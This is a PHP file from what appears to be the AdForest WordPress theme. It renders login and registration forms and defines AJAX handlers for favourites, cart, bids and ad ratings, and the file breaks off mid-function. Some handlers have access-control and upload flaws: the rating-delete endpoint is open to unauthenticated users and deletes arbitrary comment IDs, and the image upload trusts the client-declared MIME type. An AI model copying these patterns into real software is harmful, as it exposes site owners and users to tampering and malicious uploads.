<?php

if (!class_exists('authentication')) {

    class authentication {

        function adforest_sign_up_form($string, $terms, $key = '', $is_captcha = '', $key_code = '', $adforest_elementer = false, $default_registration_form = 'email') {
            global $adforest_theme;
            $captcha_type = isset($adforest_theme['google-recaptcha-type']) && !empty($adforest_theme['google-recaptcha-type']) ? $adforest_theme['google-recaptcha-type'] : 'v2';
            // Check phone is required or not
            $phone_html = '<input class="form-control" id="adforest_contact_number" name="sb_reg_contact" data-parsley-type="integer" data-parsley-required="true" data-parsley-error-message="' . __('This field is required.Should be a valid integr value', 'adforest') . '" placeholder="' . __('Your Contact Number', 'adforest') . '" type="text">';

            
            if (isset($adforest_theme['sb_user_phone_required']) && !$adforest_theme['sb_user_phone_required']) {
                $phone_html = '<input id="adforest_contact_number" placeholder="' . __('Your Contact Number', 'adforest') . '" class="form-control" type="text" name="sb_reg_contact">';
            }

            $sms_gateway = adforest_verify_sms_gateway();
            if ($sms_gateway != "") {
                $phone_html = '<input placeholder="' . __('+CountrycodePhonenumber', 'adforest') . '" class="form-control" type="text" name="sb_reg_contact" data-parsley-required="true" data-parsley-pattern="/\+[0-9]+$/" data-parsley-error-message="' . __('Format should be +CountrycodePhonenumber', 'adforest') . '">';
            }
            /* if (isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification'] && in_array('wp-twilio-core/core.php', apply_filters('active_plugins', get_option('active_plugins')))) {
              $phone_html = '<input id="adforest_contact_number" placeholder="' . __('+CountrycodePhonenumber', 'adforest') . '" class="form-control" type="text" name="sb_reg_contact" data-parsley-required="true" data-parsley-pattern="/\+[0-9]+$/" data-parsley-error-message="' . __('Format should be +CountrycodePhonenumber', 'adforest') . '">';
              } */
            if (isset($adforest_elementer) && $adforest_elementer) {
                $link_attr = '';
                $btn_args = array(
                    'btn_key' => $string,
                    'adforest_elementor' => $adforest_elementer,
                    'btn_class' => '',
                    'iconBefore' => '',
                    'iconAfter' => '',
                    'onlyAttr' => true,
                    'titleText' => 'TEST',
                );
                $link_attr = apply_filters('adforest_elementor_url_field', $link_attr, $btn_args);
                $signup_link = '<a ' . $link_attr . '>';
            } else {
                $res = adforest_extarct_link($string);
                $signup_link = '<a href="' . $res['url'] . '" title="' . $res['title'] . '" target="' . $res['target'] . '">';
            }
            $captcha = '<input type="hidden" value="no" name="is_captcha" />';
            if ($captcha_type == 'v2') {

                if ($is_captcha == 'with' && $key != "") {
                    $captcha = '<div class="form-group"><div class="g-recaptcha" data-sitekey="' . $key . '"></div></div><input type="hidden" value="yes" name="is_captcha" />';
                }
            } else {
                $captcha = '<input type="hidden" value="yes" name="is_captcha" />';
            }


            $subscriber_html = '';
            if (isset($adforest_theme['subscriber_checkbox_on_register']) && $adforest_theme['subscriber_checkbox_on_register'] == true) {
                $subscriber_text = ( isset($adforest_theme['subscriber_checkbox_on_register_text']) ) ? $adforest_theme['subscriber_checkbox_on_register_text'] : '';

                $subscriber_html = '<li><input type="checkbox" id="minimal-subscriber-1" name="minimal-subscriber-1"> <label for="minimal-subscriber-1">' . $subscriber_text . '</label></li>';
            }
            $sb_sign_in_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_sign_in_page']);
            $sb_register_with_phone = isset($adforest_theme['sb_register_with_phone']) ? $adforest_theme['sb_register_with_phone'] : false;

            $modal_html = "";
            $otp_html = "";

            if ($sb_register_with_phone && $default_registration_form == "phone") {

                $otp_html = '<form id="sb-ph-verification">
                                        <div class="modal-body">           
                                        <div class="form-group sb_ver_ph_code_div ">
                                             <label>' . __('Enter code', 'adforest') . '</label>
                                              
                                             <input class="form-control" type="text" name="sb_ph_number_code" id="sb_ph_number_code">                                              
                                        <div id="firebase-recaptcha2"></div>  
                                       </div>
                                        </div>
                                        <div class="modal-footer">
                                              <button class="btn btn-theme btn-sm" type="button" id="sb_verify_otp">' . __('Verify now', 'adforest') . '</button>
                                              <button class="btn btn-theme btn-sm no-display" type="button" id="sb_verification_ph_back">' . __('Processing ...', 'adforest') . '</button>
                                              <button class="btn btn-theme btn-sm no-display" type="button" id="sb_verification_ph_code">' . __('Verify now', 'adforest') . '</button>
                                               <button class="btn btn-theme btn-sm " type="button" id="sb_verification_resend">' . __('Resend', 'adforest') . '</button>
                                        </div>
                                 </form>';
                $modal_html = '<div class="custom-modal">
                            <div id="verification_modal" class="sb-verify-modal modal fade" role="dialog">
                               <div class="modal-dialog">
                                  <!-- Modal content-->
                                  <div class="modal-content">
                                     <div class="modal-header">
                                        <h2 class="modal-title">' . __('Verify phone number', 'adforest') . '</h2>
                                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                                     </div>
                                      ' . $otp_html . '
                                  </div>
                               </div>
                            </div>
            </div>';
            }
            if ($sb_register_with_phone && $default_registration_form == "phone") {
                $sb_precode = isset($adforest_theme['sb_preadded_code']) ? $adforest_theme['sb_preadded_code'] : false;
                $phone_label = __('Phone Number (+16505551234)', 'adforest');
                return '<form id="sb-sign-multi-form" >
                   <div class="form-group">
			  <label>' . __('Name', 'adforest') . '</label>
			  <input placeholder="' . __('Your Name', 'adforest') . '" class="form-control" type="text" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your name.', 'adforest') . '" name="sb_reg_name" id="sb_reg_name">
		   </div>
		   <div class="form-group">
			  <label>' . esc_attr($phone_label) . '</label>
			  <input placeholder="' . esc_attr($phone_label) . '" class="form-control"   data-parsley-required="true" data-parsley-error-message="' . __('Please enter valid email or phone number.', 'adforest') . '" data-parsley-trigger="change" name="sb_reg_email" id="sb_reg_email">
		   </div>
		   <div class="form-group">
			  <div class="row">
				 <div class="col-xs-12 col-md-12 col-sm-12">
					<div class="skin-minimal">
					   <ul class="list">
						  <li>
							 <input  type="checkbox" id="minimal-checkbox-1" name="minimal-checkbox-1" data-parsley-required="true" data-parsley-error-message="' . __('Please accept terms and conditions.', 'adforest') . '">
							 <label for="minimal-checkbox-1">' . __('I agree to', 'adforest') . ' ' . $signup_link . ' ' . $terms . '</a></label>
						  </li>
                                        ' . $subscriber_html . '
					   </ul>
					</div>
				 </div>
			  </div>
		   </div>
		' . $captcha . '                    
                      <div class="firebase-recaptcha" id="firebase-recaptcha"></div>
                    <input type="hidden" id="sb-register-token" value="' . wp_create_nonce('sb_register_secure') . '" />
		   <button class="btn btn-theme btn-lg btn-block" type="submit" id="sb_register_submit">' . __('Register', 'adforest') . '</button>                    
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_register_msg">' . __('Processing...', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_register_redirect">' . __('Redirecting...', 'adforest') . '</button>
		   <br />
                   <input type="hidden"  id="reg_form_type" name = "reg_form_type" value="1">
		  
					</p>
		   <input type="hidden" id="get_action" value="register" />
		   <input type="hidden" id="nonce_register" value="' . $key_code . '" />
		   <input type="hidden" id="verify_account_msg" value="' . __('Verificaton email has been sent to your email.', 'adforest') . '" />
	          <input type="hidden" id="verify_recaptcha" value="' . __('Verify Recaptcha to procees', 'adforest') . '" />	
                       <input type="hidden" id="admin_verify_account" value="' . __('Admin will verify your accouunt and let you know shortly.', 'adforest') . '" />
          </form>
                  ' . $modal_html . '                           
        ';
            }
            return '<form id="sb-sign-form" >
		   <div class="form-group">
			  <label>' . __('Name', 'adforest') . '</label>
			  <input placeholder="' . __('Your Name', 'adforest') . '" class="form-control" type="text" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your name.', 'adforest') . '" name="sb_reg_name" id="sb_reg_name">
		   </div>
		   <div class="form-group"><label>' . __('Contact Number', 'adforest') . '</label>' . $phone_html . '</div>
		   <div class="form-group">
			  <label>' . __('Email', 'adforest') . '</label>
			  <input placeholder="' . __('Your Email', 'adforest') . '" class="form-control" type="email" data-parsley-type="email" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your valid email.', 'adforest') . '" data-parsley-trigger="change" name="sb_reg_email" id="sb_reg_email">
		   </div>
		   <div class="form-group password_group">
			  <label>' . __('Password', 'adforest') . '</label>
			  <span class="sb_show_pass"><i class="fa fa-eye" aria-hidden="true"></i></span><input placeholder="' . __('Your Password', 'adforest') . '" class="form-control" type="password" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your password', 'adforest') . '" name="sb_reg_password"  id="sb_reg_password">
                              
		   </div>
                   
                   <div class="form-group password_group">
			  <label>' . __('Confirm Password', 'adforest') . '</label>
                              <span class="sb_show_pass2"><i class="fa fa-eye" aria-hidden="true"></i></span><input placeholder="' . __('Confirm Your Password', 'adforest') . '" class="form-control" type="password" data-parsley-required="true" data-parsley-error-message="' . __('Password does not match', 'adforest') . '" name="sb_reg_password_confirm" data-parsley-equalto="#sb_reg_password">                
                    </div>
		   <div class="form-group">
			  <div class="row">
				 <div class="col-xs-12 col-md-12 col-sm-12">
					<div class="skin-minimal">
					   <ul class="list">
						  <li>
							 <input  type="checkbox" id="minimal-checkbox-1" name="minimal-checkbox-1" data-parsley-required="true" data-parsley-error-message="' . __('Please accept terms and conditions.', 'adforest') . '">
							 <label for="minimal-checkbox-1">' . __('I agree to', 'adforest') . ' ' . $signup_link . ' ' . $terms . '</a></label>
						  </li>
                                         ' . $subscriber_html . '
					   </ul>
					</div>
				 </div>
			  </div>
		   </div>
		' . $captcha . '
                    <input type="hidden" id="sb-register-token" value="' . wp_create_nonce('sb_register_secure') . '" />
		   <button class="btn btn-theme btn-lg btn-block" type="submit" id="sb_register_submit">' . __('Register', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_register_msg">' . __('Processing...', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_register_redirect">' . __('Redirecting...', 'adforest') . '</button>
		   <br />
		 
					</p>
		   <input type="hidden" id="get_action" value="register" />
		   <input type="hidden" id="nonce_register" value="' . $key_code . '" />
		   <input type="hidden" id="verify_account_msg" value="' . __('Verificaton email has been sent to your email.', 'adforest') . '" />
                   <input type="hidden" id="admin_verify_account" value="' . __('Admin will verify your accouunt and let you know shortly.', 'adforest') . '" />
		</form>';
        }

        // sign In form
        function adforest_sign_in_form($key_code = '', $default_login_form = "email") {
            global $adforest_theme;
            $sb_sign_up_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_sign_up_page']);
            $sb_register_with_phone = isset($adforest_theme['sb_register_with_phone']) ? $adforest_theme['sb_register_with_phone'] : false;
            $modal_html = "";
            $otp_html = "";

            if ($sb_register_with_phone && $default_login_form == "phone") {
                $otp_html = '<form id="sb-ph-verification">
                                        <div class="modal-body">           
                                        <div class="form-group sb_ver_ph_code_div ">
                                             <label>' . __('Enter code', 'adforest') . '</label>
                                                 
                                             <input class="form-control" type="text" name="sb_ph_number_code" id="sb_ph_number_code">                                              
                                         <div id="firebase-recaptcha2"></div>   
                                        </div>
                                        </div>
                                        <div class="modal-footer">
                                              <button class="btn btn-theme btn-sm" type="button" id="sb_verify_otp">' . __('Verify now', 'adforest') . '</button>
                                              <button class="btn btn-theme btn-sm no-display" type="button" id="sb_verification_ph_back">' . __('Processing ...', 'adforest') . '</button>
                                              <button class="btn btn-theme btn-sm no-display" type="button" id="sb_verification_ph_code">' . __('Verify now', 'adforest') . '</button>
                                             <button class="btn btn-theme btn-sm " type="button" id="sb_verification_resend">' . __('Resend', 'adforest') . '</button>

                                        </div>
                                 </form>';
                $modal_html = '<div class="custom-modal">
                            <div id="verification_modal" class="sb-verify-modal modal fade" role="dialog">
                               <div class="modal-dialog">
                                  <!-- Modal content-->
                                  <div class="modal-content">
                                     <div class="modal-header">
                                        <h2 class="modal-title">' . __('Verify phone number', 'adforest') . '</h2>
                                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                                     </div>
                                      ' . $otp_html . '
                                         
                                  </div>
                               </div>
                            </div>
            </div>';
            }
            if ($sb_register_with_phone && $default_login_form == "phone") {



                $phone_label = __('Phone Number (+16505551234)', 'adforest');

                return '<form id="sb-login-multi-form" >                
		   <div class="form-group">
			  <label>' . esc_attr($phone_label) . '</label>
			  <input placeholder="' . esc_attr($phone_label) . '" class="form-control"   data-parsley-required="true" data-parsley-error-message="' . __('Please enter your valid email.', 'adforest') . '" data-parsley-trigger="change" name="sb_reg_email" id="sb_reg_email">
		   </div>

		   <div class="form-group">
			  <div class="row">
				 <div class="col-xs-12 col-sm-7">
					<div class="skin-minimal">
					   <ul class="list">
						  <li>
							 <input  type="checkbox" name="is_remember" id="is_remember">
							 <label for="is_remember">' . __('Remember Me', 'adforest') . '</label>
						  </li>
					   </ul>
					</div>
				 </div>
				 <div class="col-xs-12 col-sm-5 ">
					
				 </div>
			  </div>
		   </div>
                    <div class="firebase-recaptcha" id="firebase-recaptcha"></div>
		   <input type="hidden" id="sb-login-token" value="' . wp_create_nonce('sb_login_secure') . '" />
		   <button class="btn btn-theme btn-lg btn-block" type="submit" id="sb_login_submit">' . __('Login', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_login_msg">' . __('Processing...', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_login_redirect">' . __('Redirecting...', 'adforest') . '</button>
		   <br />
		   
		   <input type="hidden" id="nonce" value="' . $key_code . '" />
		   <input type="hidden" id="get_action" value="login" />
                   <input type="hidden" id="verify_recaptcha" value="' . __('Verifify Recaptcha to procees', 'adforest') . '" />	
		</form>' . $modal_html . '';
            }
            return '<form id="sb-login-form" >
		   <div class="form-group">
			  <label>' . __('Email', 'adforest') . '</label>
			  <input placeholder="' . __('Your Email', 'adforest') . '" class="form-control" type="email" data-parsley-type="email" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your valid email.', 'adforest') . '" data-parsley-trigger="change" name="sb_reg_email" id="sb_reg_email">
		   </div>
		   <div class="form-group password_group">
			  <label>' . __('Password', 'adforest') . '</label>
			<span class="sb_show_pass"><i class="fa fa-eye" aria-hidden="true"></i></span>  <input placeholder="' . __('Your Password', 'adforest') . '" class="form-control" type="password" data-parsley-required="true" data-parsley-error-message="' . __('Please enter your password.', 'adforest') . '" name="sb_reg_password">
		   </div>
		   <div class="form-group">
			  <div class="row">
				 <div class="col-xs-12 col-sm-7">
					<div class="skin-minimal">
					   <ul class="list">
						  <li>
							 <input  type="checkbox" name="is_remember" id="is_remember">
							 <label for="is_remember">' . __('Remember Me', 'adforest') . '</label>
						  </li>
					   </ul>
					</div>
				 </div>
				 <div class="col-xs-12 col-sm-5 ">
					<p class="help-block text-right"><a data-bs-target="#myModal" data-bs-toggle="modal">' . __('Forgot password?', 'adforest') . '</a>
					</p>
				 </div>
			  </div>
		   </div>
		   <input type="hidden" id="sb-login-token" value="' . wp_create_nonce('sb_login_secure') . '" />
		   <button class="btn btn-theme btn-lg btn-block" type="submit" id="sb_login_submit">' . __('Login', 'adforest') . '</button>
		   <button class="btn btn-theme btn-lg btn-block no-display" type="button" id="sb_login_msg">' . __('Processing...', 'adforest') . '</button>
		   
		 
		   
		   <input type="hidden" id="nonce" value="' . $key_code . '" />
		   <input type="hidden" id="get_action" value="login" />
		</form>';
        }

        // Forgot Password Form
        function adforest_forgot_password_form() {
            return '<form id="sb-forgot-form">
                             <div class="modal-body">
                                    <div class="form-group">
                                      <label>' . __('Email', 'adforest') . '</label>
                                      <input placeholder="' . __('Your Email', 'adforest') . '" class="form-control" type="email" data-parsley-type="email" data-parsley-required="true" data-parsley-error-message="' . __('Please enter valid email.', 'adforest') . '" data-parsley-trigger="change" name="sb_forgot_email" id="sb_forgot_email">
                                    </div>
                             </div>
                             <div class="modal-footer">
                                       <input type="hidden" id="sb-forgot-pass-token" value="' . wp_create_nonce('sb_forgot_pass_secure') . '" />
                                       <button class="btn btn-dark" type="submit" id="sb_forgot_submit">' . __('Reset My Account', 'adforest') . '</button>
                                       <button class="btn btn-dark" type="button" id="sb_forgot_msg">' . __('Processing...', 'adforest') . '</button>
                            </div>
		  </form>';
        }

    }

}
// Add to favourites
add_action('wp_ajax_sb_fav_ad', 'adforest_sb_fav_ad');
add_action('wp_ajax_nopriv_sb_fav_ad', 'adforest_sb_fav_ad');
if (!function_exists('adforest_sb_fav_ad')) {

    function adforest_sb_fav_ad() {
        adforest_authenticate_check();

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        $ad_id = $_POST['ad_id'];

        if (get_user_meta(get_current_user_id(), '_sb_fav_id_' . $ad_id, true) == $ad_id) {
            echo '0|' . __("You have added already.", 'adforest');
        } else {
            update_user_meta(get_current_user_id(), '_sb_fav_id_' . $ad_id, $ad_id);
            do_action('adforest_wpml_fav_ads', $ad_id);
            echo '1|' . __("Added to your favourites.", 'adforest');
        }
        die();
    }

}
// Ajax handler for add to cart
add_action('wp_ajax_sb_add_cart', 'adforest_add_to_cart');
add_action('wp_ajax_nopriv_sb_add_cart', 'adforest_add_to_cart');
if (!function_exists('adforest_add_to_cart')) {

    function adforest_add_to_cart() {
        global $adforest_theme;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        $sb_packages_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_packages_page']);
        $redirect_url = adforest_login_with_redirect_url_param(get_the_permalink($sb_packages_page));
        if (get_current_user_id() == "") {
            echo '0|' . __("You need to be logged in.", 'adforest') . '|' . $redirect_url;
            die();
        }

        $product_id = $_POST['product_id'];
        $qty = $_POST['qty'];
        global $woocommerce;
        
        if ($woocommerce->cart->add_to_cart($product_id, $qty)) {
            echo '1|' . __("Added to cart.", 'adforest') . '|' . wc_get_cart_url();
        } else {
            echo '0|' . __("Already in your cart.", 'adforest') . '|' . wc_get_cart_url();
        }
        die();
    }

}

/* Submit bid */
add_action('wp_ajax_sb_submit_bid', 'adforest_submit_bid');
add_action('wp_ajax_nopriv_sb_submit_bid', 'adforest_submit_bid');
if (!function_exists('adforest_submit_bid')) {

    function adforest_submit_bid() {

        adforest_authenticate_check();

        global $adforest_theme;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        $params = array();
        parse_str($_POST['sb_data'], $params);
        $ad_id = apply_filters('adforest_language_page_id', $params['ad_id'], 'ad_post');
        check_ajax_referer('sb_bidding_secure', 'security');
        adforest_set_date_timezone();
        $bid_end_date = get_post_meta($ad_id, '_adforest_ad_bidding_date', true); // '2018-03-16 14:59:00';
        if ($bid_end_date != "" && date('Y-m-d H:i:s') > $bid_end_date && isset($adforest_theme['bidding_timer']) && $adforest_theme['bidding_timer']) {
            echo '0|' . __('Bidding has been closed.', 'adforest');
            die();
        }

        $comments = sanitize_text_field($params['bid_comment']);
        $offer = sanitize_text_field($params['bid_amount']);
        //$ad_id = $params['ad_id'];
        $offer_by = get_current_user_id();
        $ad_author = get_post_field('post_author', $ad_id);
        if ($offer_by == $ad_author) {
            echo '0|' . __("Ad author can't post bid.", 'adforest');
            die();
        }


        $is_bidding_paid = isset($adforest_theme['sb_make_bidding_paid']) ? $adforest_theme['sb_make_bidding_paid'] : false;
        $user_paid_biddings = get_user_meta($offer_by, '_sb_paid_biddings', true);
        if ($is_bidding_paid) {
            if ($user_paid_biddings == '' || $user_paid_biddings == 0) {
                echo '0|' . __("Buy a package to post bidding against this ad", 'adforest');
                die();
            } else {
                if ($user_paid_biddings != "-1") {
                    $user_paid_biddings = $user_paid_biddings;
                    $remaining_bids = (int) $user_paid_biddings - 1;
                    update_user_meta($offer_by, '_sb_paid_biddings', $remaining_bids);
                }
            }
        }

        $bid = '';
        if ($offer == "") {
            $bid = date('Y-m-d H:i:s') . "_separator_" . $comments . "_separator_" . $offer_by;
        } else {
            $bid = date('Y-m-d H:i:s') . "_separator_" . $comments . "_separator_" . $offer_by . "_separator_" . $offer;
        }
        if (isset($adforest_theme['sb_email_on_new_bid_on']) && $adforest_theme['sb_email_on_new_bid_on']) {
            adforest_send_email_new_bid($offer_by, $ad_author, $offer, $comments, $ad_id);
        }
        $is_exist = get_post_meta($ad_id, "_adforest_bid_" . $offer_by, true);
        if ($is_exist != "") {
            update_post_meta($ad_id, "_adforest_bid_" . $offer_by, $bid);
            do_action('adforest_wpml_bid_translation', $ad_id, $offer_by, $bid);
            echo '1|' . __("Updated successfully.", 'adforest');
        } else {
            update_post_meta($ad_id, "_adforest_bid_" . $offer_by, $bid);
            do_action('adforest_wpml_bid_translation', $ad_id, $offer_by, $bid);
            echo '1|' . __("Posted successfully.", 'adforest');
        }
        die();
    }

}

/* Ad rating With Image */
function handle_ad_rating_form_submission() {
    global $adforest_theme;
    adforest_set_date_timezone();
    $sb_update_rating = isset($adforest_theme['sb_update_rating']) && $adforest_theme['sb_update_rating'] ? TRUE : FALSE;
    $sender_id = get_current_user_id();
    if (get_current_user_id() == "" || get_current_user_id() == 0) {
        echo '0|' . __("You are not logged in.", 'adforest');
        die();
    } else {    
        if (isset($_POST['action']) && $_POST['action'] === 'sb_ad_rating') {
        $params = array();
        parse_str($_POST['formdata'], $params);
        $rated_id = get_user_meta($sender_id, 'ad_ratting_' . $sender_id ."_".$params['ad_id'], true);
        $rated_already_flag = FALSE;
        if ($params['ad_id'] != '' && $params['ad_id'] == $rated_id) {
            $rated_already_flag = TRUE;
        }

        $sender = get_userdata($sender_id);

        if ($sender_id == $params['ad_owner']) {
            echo '0|' . __("Ad author can't post rating.", 'adforest');
            die();
        }

        if ($rated_already_flag && !$sb_update_rating) {
            echo '0|' . __("You've posted rating already.", 'adforest');
            die();
        }

        
        if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
            // The uploaded file is in $_FILES['file']
            $uploadedFile = $_FILES['file'];
       
            $fileName = $uploadedFile['name'];

            $fileType = $uploadedFile['type'];
            $allowedTypes = array('image/jpeg', 'image/png', 'image/jpg');
            if (!in_array($uploadedFile['type'], $allowedTypes)) {
                echo '0|' . __("Please upload a JPEG, JPG or PNG image.", 'adforest');
                die();
            }

            $fileSize = $uploadedFile['size'];
            $image_rating_size = isset($adforest_theme['adforest_review_images_size']) ? $adforest_theme['adforest_review_images_size']  : "";
          
            if ($fileSize > $image_rating_size) {
                echo '0|' . __("File size exceeds the limit. Please upload a smaller file.", 'adforest');
                die();
            }
            $themeDirectory = get_template_directory(); 
            $targetDirectory = $themeDirectory . '/images/'; 
            $uniqueFilename = wp_unique_filename($targetDirectory, $uploadedFile['name']);
            $targetFilePath = $targetDirectory . $uniqueFilename;
            
            $uploadResult = wp_upload_bits($targetFilePath, null, file_get_contents($uploadedFile['tmp_name']));
            $attachmentId = media_handle_upload('file', 0);
           
        }

        if ($sb_update_rating) {
            $args = array(
                'type__in' => array('ad_post_rating'),
                'post_id' => $params['ad_id'],
                'user_id' => $sender_id,
                'number' => 1,
                'parent' => 0,
            );
            $comment_exist = get_comments($args);
            if (count($comment_exist) > 0) {
                $comment = array();
                $comment['comment_ID'] = $comment_exist[0]->comment_ID;
                $comment['comment_content'] = sanitize_textarea_field($params['rating_comments']);
                wp_update_comment($comment);

                if(isset($params['rating'])){
                update_comment_meta($comment_exist[0]->comment_ID, 'review_stars', $params['rating']);
                
                }
                
                if(isset($_FILES['file'])){
                update_comment_meta($comment_exist[0]->comment_ID, "review_images_attachmentId", $attachmentId);
                }
                if (isset($adforest_theme['sb_rating_email_author']) && $adforest_theme['sb_rating_email_author']) {
                    adforest_email_ad_rating($params['ad_id'], $sender_id, $params['rating'], $params['rating_comments']);
                }
                echo '1|' . __("Your rating has been updated.", 'adforest');
                die();
            }
        }

        $time = date('Y-m-d H:i:s');
        $data = array(
            'comment_post_ID' => $params['ad_id'],
            'comment_author' => $sender->display_name,
            'comment_author_email' => $sender->user_email,
            'comment_author_url' => '',
            'comment_content' => sanitize_textarea_field($params['rating_comments']),
            'comment_type' => 'ad_post_rating',
            'user_id' => $sender_id,
            'comment_author_IP' => $_SERVER['REMOTE_ADDR'],
            'comment_date' => $time,
            'comment_approved' => 1,
        );

        $comment_id = wp_insert_comment($data);
        if ($comment_id) {          
            if(isset($params['rating'])){
                update_comment_meta($comment_id, 'review_stars', $params['rating']);
            }
            if(isset($_FILES['file'])){
            update_comment_meta($comment_id, "review_images_attachmentId", $attachmentId);
            }
            update_user_meta($sender_id, 'ad_ratting_' . $sender_id .'_' .$params['ad_id'] , $params['ad_id']);


            if (isset($adforest_theme['sb_rating_email_author']) && $adforest_theme['sb_rating_email_author']) {
                adforest_email_ad_rating($params['ad_id'], $sender_id, $params['rating'], $params['rating_comments']);
            }
            //do_action('adforest_wpml_comment_meta_updation', $comment_id, $params);
            echo '1|' . __("Your rating has been posted.", 'adforest');
            die();
        }
      }
    }

}

add_action('wp_ajax_sb_ad_rating', 'handle_ad_rating_form_submission');
add_action('wp_ajax_nopriv_sb_ad_rating', 'handle_ad_rating_form_submission');




/* Ad rating */
add_action('wp_ajax_sb_ad_rating', 'adforest_ad_rating');
add_action('wp_ajax_nopriv_sb_ad_rating', 'adforest_ad_rating');
if (!function_exists('adforest_ad_rating')) {

    function adforest_ad_rating() {
        global $adforest_theme;
        check_ajax_referer('sb_review_secure', 'security');
        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }
        adforest_set_date_timezone();

        $sb_update_rating = isset($adforest_theme['sb_update_rating']) && $adforest_theme['sb_update_rating'] ? TRUE : FALSE;
        $sender_id = get_current_user_id();

        if (get_current_user_id() == "" || get_current_user_id() == 0) {
            echo '0|' . __("You are not logged in.", 'adforest');
            die();
        } else {

            $params = array();
            parse_str($_POST['sb_data'], $params);

            $rated_id = get_user_meta($sender_id, 'ad_ratting_' . $sender_id ."_".$params['ad_id'], true);
            $rated_already_flag = FALSE;
            if ($params['ad_id'] != '' && $params['ad_id'] == $rated_id) {
                $rated_already_flag = TRUE;
            }

            $sender = get_userdata($sender_id);

            if ($sender_id == $params['ad_owner']) {
                echo '0|' . __("Ad author can't post rating.", 'adforest');
                die();
            }

            if ($rated_already_flag && !$sb_update_rating) {
                echo '0|' . __("You've posted rating already.", 'adforest');
                die();
            }

            if ($sb_update_rating) {
                $args = array(
                    'type__in' => array('ad_post_rating'),
                    'post_id' => $params['ad_id'],
                    'user_id' => $sender_id,
                    'number' => 1,
                    'parent' => 0,
                );
                $comment_exist = get_comments($args);
                if (count($comment_exist) > 0) {
                    $comment = array();
                    $comment['comment_ID'] = $comment_exist[0]->comment_ID;
                    $comment['comment_content'] = sanitize_textarea_field($params['rating_comments']);
                    wp_update_comment($comment);
                    
                    if(isset($params['rating'])){
                    update_comment_meta($comment_exist[0]->comment_ID, 'review_stars', $params['rating']);
                    }

                    if (isset($adforest_theme['sb_rating_email_author']) && $adforest_theme['sb_rating_email_author']) {
                        adforest_email_ad_rating($params['ad_id'], $sender_id, $params['rating'], $params['rating_comments']);
                    }
                    echo '1|' . __("Your rating has been updated.", 'adforest');
                    die();
                }
            }

            $time = date('Y-m-d H:i:s');
            $data = array(
                'comment_post_ID' => $params['ad_id'],
                'comment_author' => $sender->display_name,
                'comment_author_email' => $sender->user_email,
                'comment_author_url' => '',
                'comment_content' => sanitize_textarea_field($params['rating_comments']),
                'comment_type' => 'ad_post_rating',
                'user_id' => $sender_id,
                'comment_author_IP' => $_SERVER['REMOTE_ADDR'],
                'comment_date' => $time,
                'comment_approved' => 1,
            );

            $comment_id = wp_insert_comment($data);
            if ($comment_id) {          
                if(isset($params['rating'])){
                    update_comment_meta($comment_id, 'review_stars', $params['rating']);
                }


                update_user_meta($sender_id, 'ad_ratting_' . $sender_id .'_' .$params['ad_id'] , $params['ad_id']);


                if (isset($adforest_theme['sb_rating_email_author']) && $adforest_theme['sb_rating_email_author']) {
                    adforest_email_ad_rating($params['ad_id'], $sender_id, $params['rating'], $params['rating_comments']);
                }
                //do_action('adforest_wpml_comment_meta_updation', $comment_id, $params);
                echo '1|' . __("Your rating has been posted.", 'adforest');
                die();
            }
        }
    }
}



// ADS rating delete
add_action('wp_ajax_ads_rating_delete', 'adforest_ads_rating_delete');
add_action('wp_ajax_nopriv_ads_rating_delete', 'adforest_ads_rating_delete');
if (!function_exists('adforest_ads_rating_delete')) {
    function adforest_ads_rating_delete () {
   
        $ad_id =  $_POST['ad_id'];
        $comment_id   =  $_POST['comment_id'];
        $sender_id  =  get_current_user_id();
        $check_comment   = get_user_meta($sender_id, 'ad_ratting_' . $sender_id .'_' .$ad_id );
       if($check_comment != ""){
        
        wp_delete_comment( $comment_id );
        delete_user_meta($sender_id, 'ad_ratting_' . $sender_id .'_' .$ad_id);
       
         echo '1|' . __("Ads Raiting delete Successfully", 'adforest');
            die();
        }     
        else {
             echo '0|' . __("You are not allowed to delete this", 'adforest');
        } 
    }
}


/* Ad rating Reply */
add_action('wp_ajax_sb_ad_rating_reply', 'adforest_ad_rating_reply');
add_action('wp_ajax_nopriv_ad_rating_reply', 'adforest_ad_rating_reply');
if (!function_exists('adforest_ad_rating_reply')) {

    function adforest_ad_rating_reply() {

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        check_ajax_referer('sb_review_reply_secure', 'security');
        adforest_set_date_timezone();
        if (get_current_user_id() == "") {
            echo '0|' . __("You are not logged in.", 'adforest');
            die();
        } else {

            global $adforest_theme;
            $params = array();
            parse_str($_POST['sb_data'], $params);

            $sender_id = get_current_user_id();
            $sender = get_userdata($sender_id);

            if ($sender_id != $params['ad_owner']) {
                echo '0|' . __("Only Ad owner can reply the rating.", 'adforest');
                die();
            }

            $args = array(
                'type__in' => array('ad_post_rating'),
                'post_id' => $params['ad_id'],
                'user_id' => $sender_id,
                'number' => 1,
